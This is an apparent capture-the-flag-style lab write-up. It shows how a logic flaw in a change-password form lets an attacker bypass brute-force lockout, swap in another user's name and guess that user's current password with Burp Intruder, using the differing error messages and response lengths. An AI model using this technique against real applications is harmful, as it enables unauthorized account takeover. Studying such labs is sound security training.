# Lab: Password brute-force via password change

## 🎯 Goal


Exploit a flaw in the **Change Password** functionality to bypass the application's **brute-force protection**, 
brute-force Carlos's current password, and access his **My account** page.



---



## 💡 Vulnerability



The application has brute-force protection. Normally, entering an incorrect current password while keeping the two new 
passwords identical causes a logout and a temporary lockout.



However, there is a **logic flaw** in the password-change functionality.



If:



```text
new-password-1 ≠ new-password-2

```



the brute-force protection is not triggered.



This allows us to send multiple password guesses without being locked out.



---



## 🔎 Understanding the Logic



We tested different combinations of passwords.



### 1. Incorrect current password + Matching new passwords



```text

Current password: wrong

New password: password

Confirm password: password

```



Result:



* The user is logged out.

* A temporary lockout is triggered.

* The application prevents further attempts.




---




### 2. Incorrect current password + Different new passwords




```text

Current password: wrong

New password: password1

Confirm password: password2

```



Response:



```text

Current password is incorrect

```



No lockout is triggered.


---



### 3. Correct current password + Different new passwords



```text

Current password: correct

New password: password1

Confirm password: password2


```



Response:



```text

New passwords do not match

```



This difference gives us a way to identify the correct current password.



---



# 🛠️ Exploitation




## 1. Login



Use the provided credentials:



```text

Username: wiener

Password: peter

```



Then navigate to:



```text

My account → Change password

```



---



## 2. Test the password-change functionality



Send a password-change request with two different new passwords:




```http

POST /my-account/change-password



username=wiener

&current-password=peter

&new-password-1=12345

&new-password-2=123455

```



The important part is:



```text

new-password-1 ≠ new-password-2

```



---



## 3. Change the username



Change:



```text

username=wiener

```



to:



```text

username=carlos

```



The application does not properly verify that the username in the request belongs to the current session.



The final request becomes:


```http

POST /my-account/change-password



username=carlos

&current-password=§candidate§

&new-password-1=12345

&new-password-2=123455

```


---



# 🔨 Burp Intruder



Send the request to:



```text

Intruder

```



### Positions



Clear the automatically selected positions and mark only:



```text

current-password=§candidate§

```



Keep:


```text

username=carlos

```



and:



```text

new-password-1=12345

new-password-2=123455

```



The two new passwords must remain different to bypass the lockout.




---




## 📋 Payloads



Use:



```text

Payload type: Simple list

```



Paste the **Candidate passwords** provided by the lab.



---



## 📊 Identifying the Correct Password



Most requests return:



```text

Current password is incorrect

```



The correct password produces:



```text

New passwords do not match

```



The correct response also had a **different/shorter Response Length**, which helped identify the successful candidate.



The correct password was:



```text

matrix

```



---



# 🔐 Access Carlos's Account



Use:



```text

Username: carlos

Password: matrix

```



Log in and access the **My account** page.



The lab is successfully solved.



---



## 🧠 Key Takeaway



The attack is based on a **logic flaw that allows brute-force protection to be bypassed**.



```text

Logic flaw

    ↓

Make the new passwords different

    ↓

Bypass the brute-force protection

    ↓

Brute-force current-password

    ↓

Identify the different response

    ↓

Obtain Carlos's password

    ↓

Access his account

```



The key lesson is that differences in application responses can act as a **side-channel** for identifying valid 
credentials.



---



## 🔑 Vulnerabilities Used



* Logic flaw in password-change functionality

* Brute-force protection bypass

* Improper server-side validation

* Missing username/session validation

* Response-based password enumeration

